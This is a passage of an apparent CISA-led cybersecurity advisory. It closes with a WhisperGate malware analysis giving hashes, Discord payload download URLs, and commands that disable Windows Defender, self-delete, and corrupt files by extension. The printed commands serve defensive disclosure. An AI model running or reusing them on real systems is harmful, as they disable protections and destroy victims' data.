<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-4034\" title=\"CVE-2021-4034\">NIST NVD: CVE-2021-4034</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-27666\" title=\"CVE-2022-27666\">NIST NVD: CVE-2022-27666</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33044\" title=\"CVE-2021-33044\">NIST NVD: CVE-2021-33044</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33045\" title=\"CVE-2021-33045\">NIST NVD: CVE-2021-33045</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26134\" title=\"CVE-2022-26134\">NIST NVD: CVE-2022-26134</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26138\" title=\"CVE-2022-26138\">NIST NVD: CVE-2022-26138</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3236\" title=\"CVE-2022-3236\">NIST NVD: CVE-2022-3236</a></li>
<li><a href=\"https://attack.mitre.org/software/S0521/\" title=\"BloodHound\">MITRE: BloodHound</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S1040/\" title=\"Rclone\">MITRE: Rclone</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S0598/\" title=\"P.A.S. Webshell\">MITRE: P.A.S. Webshell</a></li>
<li><a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">CISA: Known Exploited Vulnerabilities Catalog</a></li>
<li><a href=\"https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf\" title=\"Remediate Vulnerabilities for Internet-Accessible Systems\">CISA Insights: Remediate Vulnerabilities for Internet-Accessible Systems</a></li>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/defending-against-software-supply-chain-attacks-0\" title=\"Defending Against Supply Chain Attacks\">CISA, NIST: Defending Against Supply Chain Attacks</a></li>
<li><a href=\"https://www.cisa.gov/news-events/alerts/2023/03/21/cisa-and-nsa-release-enduring-security-framework-guidance-identity-and-access-management\" title=\"IAM Recommended Best Practices Guide for Administrators\">CISA, NSA: IAM Recommended Best Practices Guide for Administrators</a></li>
</ul>
<h2><strong>References</strong></h2>
<ol>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/\" title=\"Destructive Malware Targeting Ukrainian Organizations\">Microsoft Threat Intelligence Center: Destructive Malware Targeting Ukrainian Organizations</a></li>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/?msockid=2383e2d882c06a751a17f64383d26b64\" title=\"Cadet Blizzard Emerges as a Novel and Distinct Russian Threat Actor\">Microsoft Threat Intelligence Center: Cadet Blizzard Emerges as a Novel and Distinct Russian Threat Actor</a></li>
<li><a href=\"https://www.crowdstrike.com/blog/who-is-ember-bear/\" title=\"Featured Recent Videos Categories Start Free Trial Featured Recent Videos Categories Start Free Trial\">CrowdStrike: EMBER BEAR Threat Actor Profile</a></li>
<li><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/russia-invasion-ukraine-retaliation/\" title=\"Responses to Russia's Invasion of Ukraine Likely to Spur Retaliationred Recent Videos Categories Start Free Trial\">Mandiant Threat Intelligence: Responses to Russia's Invasion of Ukraine Likely to Spur Retaliation</a>&nbsp;</li>
<li><a href=\"https://www.sentinelone.com/blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/\" title=\"Threat Actor UAC-0056 Targeting Ukraine with Fake Translation Software\">SentinelOne: Threat Actor UAC-0056 Targeting Ukraine with Fake Translation Software</a></li>
<li><a href=\"https://www.acunetix.com/support/docs/introduction/\" title=\"Introduction to Acunetix\">Introduction to Acunetix</a></li>
<li><a href=\"https://github.com/owasp-amass/amass\" title=\"owasp-amass / amass\">GitHub: OWASP Amass</a></li>
<li><a href=\"https://kalilinuxtutorials.com/droopescan/\" title=\"Droopescan : A Plugin-Based Scanner That Aids Security Researchers\">Kali Linux Tutorials: Droopescan</a></li>
<li><a href=\"https://github.com/OWASP/joomscan\" title=\"OWASP / joomscan\">GitHub: OWASP JoomScan</a></li>
<li><a href=\"https://www.kali.org/tools/masscan/\" title=\"Masscan\">Kali.org: MASSCAN</a></li>
<li><a href=\"https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections\" title=\"How To Use Netcat to Establish and Test TCP and UDP Connections\">DigitalOcean: How To Use Netcat to Establish and Test TCP and UDP Connections</a></li>
<li><a href=\"https://help.shodan.io/the-basics/what-is-shodan\" title=\"What is Shodan?\">Shodan: What is Shodan?</a></li>
<li><a href=\"https://docs.virustotal.com/docs/how-it-works\" title=\"How it Works\">VirusTotal: How it Works</a></li>
<li><a href=\"https://github.com/jbaines-r7/through_the_wire\" title=\"Through the Wire\">GitHub: Through the Wire</a></li>
<li><a href=\"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html\" title=\"Confluence Security Advisory: Confluence Server and Data Center - CVE-2022-26134\">Confluence Security Advisory: Confluence Server and Data Center - CVE-2022-26134</a></li>
<li><a href=\"https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010\" title=\"Microsoft Security Bulletin MS17-010 - Critical\">Microsoft: Security Bulletin MS17-010</a></li>
<li><a href=\"https://www.avast.com/c-eternalblue\" title=\"What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant?\">Avast: What is EternalBlue and Why is the MS17-010 Exploit Still Relevant?</a></li>
<li><a href=\"https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/\" title=\"Threat Brief: Ongoing Russia and Ukraine Cyber Activity\">Palo Alto Networks Unit 42: Threat Brief - Ongoing Russia and Ukraine Cyber Activity</a></li>
<li><a href=\"https://cert.gov.ua/article/18419\" title=\"CERT-UA#3799 Report\">CERT-UA#3799 Report</a></li>
<li><a href=\"https://www.bellingcat.com/news/2022/02/23/attack-on-ukrainian-government-websites-linked-to-russian-gru-hackers/\" title=\"Attack on Ukrainian Government Websites Linked to GRU Hackers\">Bellingcat: Attack on Ukrainian Government Websites Linked to GRU Hackers</a></li>
<li><a href=\"https://www.trendmicro.com/en_us/research/22/c/cyberattacks-are-prominent-in-the-russia-ukraine-conflict.html\" title=\"Cyberattacks are Prominent in the Russia-Ukraine Conflict\">Trend Micro: Cyberattacks are Prominent in the Russia-Ukraine Conflict</a></li>
</ol>
<h2><strong>Contact Information</strong></h2>
<p>To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact <a href=\"https://www.fbi.gov/contact-us/field-offices\">your local FBI field office</a> or CISA’s 24/7 Operations Center at <a href=\"mailto:saycisa@cisa.dhs.gov\" title=\"Email CISA\">saycisa@cisa.dhs.gov</a> or (888) 282-0870. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. For NSA client requirements or general cybersecurity inquiries, contact <a href=\"mailto:Cybersecurity_Requests@nsa.gov\">Cybersecurity_Requests@nsa.gov</a>.</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. CISA and the authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the authoring agencies.</p>
<h2><strong>Version History</strong></h2>
<p><strong>September 5, 2024:</strong> Initial version.</p>
<h2><strong>Appendix A: WhisperGate Malware Analysis</strong></h2>
<h3>Overview</h3>
<p>This technical analysis details the WhisperGate malware deployed against Ukraine; samples were collected from one victim and analyzed. The analysis provides insight into Unit 29155 cyber actor infrastructure used for network scanning, password compromising, and data exfiltration against Ukraine, NATO members in Europe and North America, and countries in Latin America and Central Asia.</p>
<p>Unit 29155 cyber actors’ use of WhisperGate involved the deployment of the malware files, <code>stage1.exe</code> and <code>stage2.exe</code>. WhisperGate has two stages that corrupts a system’s master boot record, displays a fake ransomware note, and encrypts files based on certain file extensions (see <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a\">AA22-057A</a>). The actors used multiple Discord accounts to store malware files, including what appears to be development versions or iterations of the binaries. Discord is commonly leveraged by threat actors as an endpoint for malware distribution and control; in this case, it was used to obtain the next step of the infection chain by directly sharing files through its platform. In the case of <code>stage2.exe</code>, the binary communicated with Discord to obtain <code>Tbopbh.jpg</code>—the malicious payload that is in-memory loaded and performs the destructive capabilities.[<a href=\"https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/\">18</a>]</p>
<h3>Categorization</h3>
<p>The Discord accounts associated with the WhisperGate campaign are categorized into three main clusters, labeled below as Clusters 1, 2, and 3. All clusters used Discord as a staging environment for malware deployment. These groupings are based on analysis of threat actor IP addresses and the nature of the malware that existed within the accounts. The following sections include notable details found within each cluster.</p>
<h4><strong>Cluster 1</strong></h4>
<p>Cluster 1 contained the following files:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg</code> (a resource, e.g., payload, for stage2.exe)[<a href=\"https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/\">18</a>]</li>
<li><code>saint.exe</code> (a downloader, <code>SaintBot</code>, as detailed by CERT-UA)[<a href=\"https://cert.gov.ua/article/18419\">19</a>]</li>
<li><code>puttyjejfrwu.exe</code>[<a href=\"https://cert.gov.ua/article/18419\">19</a>]</li>
</ul>
<h4><strong>Cluster 2</strong></h4>
<p>Cluster 2 contained:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/888408190625128461/895633952247799858/n.lashevychdirekcy.atom.gov.ua.zip</code> (means for sending malware in over 35 different zip files via Discord links)[<a href=\"https://www.bellingcat.com/news/2022/02/23/attack-on-ukrainian-government-websites-linked-to-russian-gru-hackers/\">20</a>]</li>
<li>Several Microsoft Word documents with macros that download <code>test01.exe</code> from <code>3237.site</code>. Once executed, <code>test01.exe</code> downloads <code>load2022.exe</code> from <code>smm2021.net</code>.</li>
</ul>
<h4><strong>Cluster 3</strong></h4>
<p>Cluster 3 contained:</p>
<ul>
<li><code>hxxps://cdn.discordapp[.]com/attachments/945968593030496269/945970446149509130/Client.exe</code> (<strong>Note:&nbsp;</strong>Unit 29155 cyber actors’ use of <code>Client.exe</code> was confirmed as linked to the activity, but the file was not obtained for analysis and functionality cannot be confirmed.)&nbsp;</li>
<li><code>asd.exe</code> (likely a development version of <code>stage1.exe</code>)</li>
</ul>
<h3>Behavioral Analysis</h3>
<p>Two Windows Portable Executable (PE) files (<code>stage1.exe</code> and <code>stage2.exe</code>) were obtained from the Ukrainian victim for analysis. One PE file (<code>asd.exe</code>) was obtained from a U.S. victim.</p>
<h4><strong>stage1.exe</strong></h4>
<p><code>stage1.exe</code> was obtained from the C:\\ path of the Ukrainian victim’s Windows machine. <code>stage1.exe</code> executes when the infected device is powered down, overwriting the master boot record (MBR) and preventing the system from booting normally. <strong>Table 15</strong> lists the hashes and properties attributed to <code>stage1.exe</code>.</p>
<div>
<table>
<caption><em>Table 15: stage1.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>5d5c99a08a7d927346ca2dafa7973fc1</td>
</tr>
<tr>
<th>SHA-256</th>
<td>a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92</td>
</tr>
<tr>
<th>Compiler</th>
<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[GUI32]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 05:37:18</td>
</tr>
<tr>
<th>Execution Message</th>
<td>Your hard drive has been corrupted. In case you want to recover all hard drives of your organization, You should pay us $10k via bitcoin wallet 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via tox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65 with your organization name. We will contact you to give further instructions.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table>
<caption><em>Table 16: asd.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>eac0ae655d344c25ff467a929790885c</td>
</tr>
<tr>
<th>SHA-256</th>
<td>b9e64b58d7746cb1d3bed20405ef34d097af08c809d8dad10b9296b0bebb2b0b</td>
</tr>
<tr>
<th>Compiler</th>
<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[Console32,console]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>1969-12-31 19:00:00</td>
</tr>
</tbody>
</table>
</div>
<p><code>asd.exe</code> is likely a development version of <code>stage1.exe</code>. While the behavior of <code>asd.exe</code> is similar to <code>stage1.exe</code>, the messages displayed were different.</p>
<h4><strong>stage2.exe</strong></h4>
<p><code>stage2.exe</code> was obtained from the C:\\ path of the Ukrainian victim’s Windows machine. <strong>Table 17</strong> lists the hashes and properties attributed to <code>stage2.exe</code>.</p>
<div>
<table>
<caption><em>Table 17: stage2.exe Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>764f691b2168e8b3b6f9fb6582e2f819</td>
</tr>
<tr>
<th>SHA-256</th>
<td>aa79afbf82b06cda268664b7c83900d8f7a33e0f0071facba0b3d8f7a68ce56a</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)(GUI32,signed)</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:54</td>
</tr>
</tbody>
</table>
<p><strong>Table 18</strong> lists the following chronological observations when stage2.exe executes.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 18: stage2.exe Behavioral Analysis Observations</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Event</th>
<th role=\"columnheader\">Victim Observation</th>
</tr>
</thead>
<tbody>
<tr>
<td>PowerShell command executed twice</td>
<td><code>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" –enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==</code></td>
</tr>
<tr>
<td>Base64 UTF-16LE string decoded</td>
<td><code>Start-Sleep -s 10</code></td>
</tr>
<tr>
<td>HTTP GET request sent to Discord URL to download Tbopbh.jpg</td>
<td>
<p><code>hxxp://cdn.discordapp.com/attachments/</code></p>
<p><code>928503440139771947/930108637681184768/Tbopbh[.]jpg</code></p>
</td>
</tr>
<tr>
<td>Nmddfrqqrbyjeygggda.vbs created and executed within the %TEMP% directory</td>
<td>
<p>The Visual Basic Script (VBS) file contained the following command:</p>
<p><code>CreateObject(“WScript.Shell”).Run “powershell Set-MpPreference -ExclusionPath ‘C:\\’”, 0, False</code></p>
</td>
</tr>
<tr>
<td>AdvancedRun.exe created and executed twice</td>
<td>
<p><code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Temp\\AdvancedRun.exe” /EXEFilename “C:\\Windows\\System32\\sc.exe” /WindowState 0 /CommandLine “stop WinDefend”&nbsp; /StartDirectory “” /RunAs 8 /Run</code></p>
<p><code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Temp\\AdvancedRun.exe” /EXEFilename “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” /WindowState 0 /CommandLine “rmdir ‘C:\\ProgramData\\Microsoft\\Windows Defender’ –Recurse” /StartDirectory “” /RunAs 8 /Run</code></p>
</td>
</tr>
<tr>
<td>InstallUtil.exe created and executed; files corrupted following execution</td>
<td><code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Temp\\InstallUtil.exe</code></td>
</tr>
</tbody>
</table>
<h3>Static Analysis</h3>
<p>Static analysis was further conducted on two files (<code>stage2.exe</code>, <code>Tbopbh.jpg</code>) to uncover additional malware functionality and attributes.</p>
<h4><strong>stage2.exe</strong></h4>
<p>Static analysis was performed on a variant of stage2.exe; its hashes and properties are listed in <strong>Table 19</strong> below. Of note, the MD5 and SHA-256 hash values were different than those obtained from the Ukrainian victim machine (listed above in <strong>Table 17</strong>). Behavioral analysis was also performed on the below variant and both files exhibited the same behavior.</p>
<div>
<table>
<caption><em>Table 19: stage2.exe Variant Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>14c8482f302b5e81e3fa1b18a509289d</td>
</tr>
<tr>
<th>SHA-256</th>
<td>dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)(GUI32,signed)</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:54</td>
</tr>
</tbody>
</table>
<p>This variant of <code>stage2.exe</code> contained multiple layers of execution:</p>
<ul>
<li><code>stage2.exe</code> contained a WebClient object that was initialized with Discord URL <code>hxxps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg</code> to obtain the payload <code>Tbopbh.jpg</code>.</li>
<li><code>stage2.exe</code> contained logic to reverse file bytes of a file using the Array’s Reverse method.</li>
<li><code>stage2.exe</code> contained logic to load an Assembly object into a Stream object.</li>
<li><code>stage2.exe</code> used the reflection library to call method <code>Ylfwdwgmpilzyaph</code> from the loaded Assembly object.</li>
<li><code>stage2.exe</code> contained decryption logic that resembled RC4, a C# class produced a base64 string and an encryption class which created a key using the decoded string. The encryption class used encryption logic every 32 bytes to decrypt. Additionally, the XOR functionality occurred using the initialized byte “Array” shown below. The encryption class resembled RC4; it was used every 32 bytes. The base64 string came from a class that contained EazFuscator logic to obfuscate code by eliminating control flow within code, as well as making symbols difficult to analyze:
<ul>
<li><code>byte[] array = new byte[] {148, 68, 208, 52, 241, 93, 195, 220};</code></li>
</ul>
</li>
<li><code>stage2.exe</code> contained EazFuscator class logic. This included logic that built strings during runtime; otherwise, the full strings would have been obfuscated and further segmented when viewed statically. The following is an example of a built string:
<ul>
<li><code>UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==</code></li>
</ul>
</li>
<li>When the above string was base64 decoded, the system displayed the following PowerShell command: <code>Start-Sleep -s 10</code></li>
<li><code>stage2.exe</code> served as the downloader and driver logic for the malware payload, <code>Tbopbh.jpg</code>.</li>
</ul>
<h4><strong>Tbopbh.jpg (payload for stage2.exe variant)</strong></h4>
<p>An account in Discord Cluster 1 contained malware with the following hashes, labeled as Tbopbh.jpg:</p>
<ul>
<li>MD5: <code>b3370eb3c5ef6c536195b3bea0120929</code></li>
<li>SHA-256: <code>923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6</code></li>
</ul>
<p>When viewing payload <code>Tbopbh.jpg</code> using a hex editor, it ended with value “ZM” or hex values “5A 4D”—this indicated the payload was a reversed PE. Reversing the bytes of <code>Tbopbh.jpg</code> revealed the hashes of the resulting payload listed in <strong>Table 20</strong> below.</p>
<div>
<table>
<caption><em>Table 20: Tbopbh.jpg Properties</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>e61518ae9454a563b8f842286bbdb87b</td>
</tr>
<tr>
<th>SHA-256</th>
<td>9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d</td>
</tr>
<tr>
<th>Protector</th>
<td>Eazfuscator(-)[-]</td>
</tr>
<tr>
<th>Library</th>
<td>.NET(v4.0.30319)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>Microsoft Linker(6.0)[DLL32]</td>
</tr>
<tr>
<th>TimeDateStamp</th>
<td>2022-01-10 09:39:31</td>
</tr>
</tbody>
</table>
<p>The original filename from the resulting payload was a Dynamic Link Library (DLL) file, <code>Frkmlkdkdubkznbkmcf.dll</code>; its attributes are listed in <strong>Table 21</strong>:</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 21: Frkmlkdkdubkznbkmcf.dll Attributes</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Resources</th>
<th role=\"columnheader\">Classes</th>
<th role=\"columnheader\">Methods&nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>\\u2005 \\u2005 \\u2009 \\u2008 \\u2001 \\u2007 \\u2009 \\u200b \\u200a \\u2005</p>
<p><strong>Note:</strong> This format annotates action taken by EazFuscator to obfuscate items, making it difficult for malware analysts to review.</p>
</td>
<td>Main - ClassLibrary1</td>
<td>\\u0002</td>
</tr>
<tr>
<td>7c8cb5598e724d34384cce7402b11f0e</td>
<td>pc1eOx2WJVV1579235895 –</td>
<td>Ylfwdwgmpilzyaph</td>
</tr>
<tr>
<td>78c855a088924e92a7f60d661c3d1845</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<p><code>stage2.exe</code> was observed calling method <code>Ylfwdwgmpilzyaph</code> to begin decrypting resource <code>78c855a088924e92a7f60d661c3d1845</code>. The reflection library was used to execute method <code>Ylfwdwgmpilzyaph</code>, as shown in the following C# code block:</p>
<p><code>using System.Reflection;</code><br><code>string path = \"Frkmlkdkdubkznbkmcf.dll\";</code><br><code>string fqpn = Path.GetFullPath(path);</code><br><code>Assembly assembly = Assembly.LoadFile(fqpn);</code><br><code>Type type = assembly.GetType(\"ClassLibrary1.Main\");</code><br><code>type.InvokeMember(\"Ylfwdwgmpilzyaph\", BindingFlags.InvokeMethod, null, null, null);</code></p>
<p>The following application configuration accompanied the above code block to allow loading from remote sources:</p>
<p><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;</code><br><code>&lt;configuration&gt;</code><br><code>&lt;runtime&gt;</code><br><code>&lt;loadFromRemoteSources enabled=\"true\"/&gt;</code><br><code>&lt;/runtime&gt;</code><br><code>&lt;/configuration&gt;</code></p>
<p>Upon invoking the method <code>Ylfwdwgmpilzyaph</code>, <code>Nmddfrqqrbyjeygggda.vbs</code> wrote to the Windows %TEMP% directory and has the following attributes, as listed in <strong>Table 22</strong> below.</p>
<div>
<table>
<caption><em>Table 22: Nmddfrqqrbyjeygggda.vbs Attributes</em></caption>
<tbody>
<tr>
<th>MD5</th>
<td>6eed4ee0cc57126e9a096ab9905f471c</td>
</tr>
<tr>
<th>SHA-256</th>
<td>db5a204a34969f60fe4a653f51d64eee024dbf018edea334e8b3df780eda846f</td>
</tr>
<tr>
<th>VBS Code</th>
<td>CreateObject(\"WScript.Shell\").Run \"powershell Set-MpPreference -ExclusionPath 'C:\\'\", 0, False</td>
</tr>
</tbody>
</table>
<p>The VBS code listed in <strong>Table 22</strong> used a WScript shell that executed as a Windows application, which ran a PowerShell command to exclude the C:\\ drive from Windows Defender's security checks. Malware analysts decoded and decrypted one of the resources from <code>Frkmlkdkdubkznbkmcf.dll</code> (<code>78c855a088924e92a7f60d661c3d1845</code>). Further analysis of <code>Frkmlkdkdubkznbkmcf.dll</code> resulted in an additional DLL file with the following hashes:</p>
<ul>
<li>MD5: <code>5a537673c34933fc854fbfb65477a686</code></li>
<li>SHA-256: <code>35feefe6bd2b982cb1a5d4c1d094e8665c51752d0a6f7e3cae546d770c280f3a</code></li>
</ul>
<p>This decrypted DLL file contained two resources, <code>AdvancedRun</code> and <code>Waqybg</code>.</p>
<ul>
<li><code>AdvancedRun</code><strong> </strong>(GZIP)
<ul>
<li>MD5: <code>de85ca91e1e8100a619de1c25112f1a5</code></li>
<li>SHA-256: <code>489ab4819830d231c3fc3572c5386cad9d18773a8121373ea8174de981cc9166</code></li>
</ul>
</li>
<li><code>Waqybg</code><strong> </strong>(GZIP)
<ul>
<li>Reversed byte order:
<ul>
<li>MD5: <code>9b1191f1ceddf312b0d609cd929c6631</code></li>
<li>SHA-256: <code>0dd61a16c625c49ffefaf4ce24cabf9a074028a06640d9bbb804f735ff56dfa3</code></li>
</ul>
</li>
<li>Original byte order:
<ul>
<li>MD5: <code>29d83f29c0b0a0b7499e71e7d5cb713f</code></li>
<li>SHA-256: <code>fd4a5398e55beacb2315687a75af5aa15b776b5d36b9800a1792ede3955616c2</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Table 23</strong> and <strong>Table 24</strong> list the file properties for both the <code>AdvancedRun</code> and reversed <code>Waqybg</code> decompressed files.</p>
<div>
<table>
<caption><em>Table 23: AdvancedRun (decompressed)</em></caption>
<tbody>
<tr>
<th>Type</th>
<td>Win32 EXE</td>
</tr>
<tr>
<th>Company</th>
<td>NirSoft</td>
</tr>
<tr>
<th>TimeStamp</th>
<td>2020:08:03 09:41:38-04:00</td>
</tr>
<tr>
<th>Original File Name</th>
<td>AdvancedRun.exe</td>
</tr>
<tr>
<th>MD5</th>
<td>17fc12902f4769af3a9271eb4e2dacce</td>
</tr>
<tr>
<th>SHA-256</th>
<td>29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b</td>
</tr>
</tbody>
</table>
<div>
<table>
<caption><em>Table 24: Waqybg (reversed; decompressed)</em></caption>
<tbody>
<tr>
<th>Type</th>
<td>Win32 EXE</td>
</tr>
<tr>
<th>TimeStamp</th>
<td>2022:01:10 03:14:38-05:00</td>
</tr>
<tr>
<th>MD5</th>
<td>3907c7fbd4148395284d8e6e3c1dba5d</td>
</tr>
<tr>
<th>SHA-256</th>
<td>34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907</td>
</tr>
<tr>
<th>Compiler</th>
<td>MinGW(GCC: (GNU) 6.3.0)[-]</td>
</tr>
<tr>
<th>Linker</th>
<td>GNU linker Id (GNU Binutils)(2.28)[Console32,console]</td>
</tr>
</tbody>
</table>
<p>The reversed and decompressed <code>Waqybg</code> files contained file corruption logic along with a final command to ping arbitrarily and delete itself: <code>cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 &gt; Nul &amp; Del /f /q “%s”</code>. <code>Waqybg</code> is known as WhisperKill—a malware downloaded by WhisperGate that destroys files with specific extensions.[<a href=\"https://cert.gov.ua/article/18419\">19</a>],[<a href=\"https://www.trendmicro.com/en_us/research/22/c/cyberattacks-are-prominent-in-the-russia-ukraine-conflict.html\">21</a>]</p>
<p>The following file extensions listed in <strong>Table 25&nbsp;</strong>were targeted for file corruption with the equivalent of the “wcscmp” C function logic (a string compare function). The corruption logic included overwriting 0x100000 or 1 MB worth of 0xcc values per targeted file.</p>
<table>
<caption><em>Table 25: File Extensions Targeted by WhisperKill</em></caption>
<tbody>
<tr>
<td><a>u\".3DM\"</a></td>
<td>u\".3DS\"</td>
<td>u\".602\"</td>
<td>u\".ACCDB\"</td>
<td>u\".ARC\"</td>
<td>u\".ASC\"</td>
</tr>
<tr>
<td>u\".ASM\"</td>
<td>u\".ASP\"</td>
<td>u\".ASPX\"</td>
<td>u\".BACKUP\"</td>
<td>u\".BAK\"</td>
<td>u\".BAT\"</td>
</tr>
<tr>
<td>u\".BMP\"</td>
<td>u\".BRD\"</td>
<td>u\".BZ2\"</td>
<td>u\".CGM\"</td>
<td>u\".CLASS\"</td>
<td>u\".CMD\"</td>
</tr>
<tr>
<td>u\".CONFIG\"</td>
<td>u\".CPP\"</td>
<td>u\".CRT\"</td>
<td>u\".CSR\"</td>
<td>u\".CSV\"</td>
<td>u\".DBF\"</td>
</tr>
<tr>
<td>u\".DCH\"</td>
<td>u\".DER\"</td>
<td>u\".DIF\"</td>
<td>u\".DIP\"</td>
<td>u\".DJVU.SH\"</td>
<td>u\".DOC\"</td>
</tr>
<tr>
<td>u\".DOCB\"</td>
<td>u\".DOCM\"</td>
<td>u\".DOCM\"</td>
<td>u\".DOCX\"</td>
<td>u\".DOT\"</td>
<td>u\".DOTM\"</td>
</tr>
<tr>
<td>u\".DOTX\"</td>
<td>u\".DWG\"</td>
<td>u\".EDB\"</td>
<td>u\".EML\"</td>
<td>u\".FRM\"</td>
<td>u\".GIF\"</td>
</tr>
<tr>
<td>u\".HDD\"</td>
<td>u\".HTM\"</td>
<td>u\".HWP\"</td>
<td>u\".IBD\"</td>
<td>u\".INC\"</td>
<td>u\".INI\"</td>
</tr>
<tr>
<td>u\".ISO\"</td>
<td>u\".JAR\"</td>
<td>u\".JAVA\"</td>
<td>u\".JPEG\"</td>
<td>u\".JPG\"</td>
<td>u\".JSP\"</td>
</tr>
<tr>
<td>u\".KDBX\"</td>
<td>u\".KEY\"</td>
<td>u\".LAY\"</td>
<td>u\".LAY6\"</td>
<td>u\".LDF\"</td>
<td>u\".LOG\"</td>
</tr>
<tr>
<td>u\".MAX\"</td>
<td>u\".MDB\"</td>
<td>u\".MDF\"</td>
<td>u\".MML\"</td>
<td>u\".MSG\"</td>
<td>u\".MYD\"</td>
</tr>
<tr>
<td>u\".MYI\"</td>
<td>u\".NEF\"</td>
<td>u\".NVRAM\"</td>
<td>u\".ODB\"</td>
<td>u\".ODG\"</td>
<td>u\".ODP\"</td>
</tr>
<tr>
<td>u\".ODS\"</td>
<td>u\".ODT\"</td>
<td>u\".OGG\"</td>
<td>u\".ONETOC2\"</td>
<td>u\".OST\"</td>
<td>u\".OTG\"</td>
</tr>
<tr>
<td>u\".OTP\"</td>
<td>u\".OTS\"</td>
<td>u\".OTT\"</td>
<td>u\".P12\"</td>
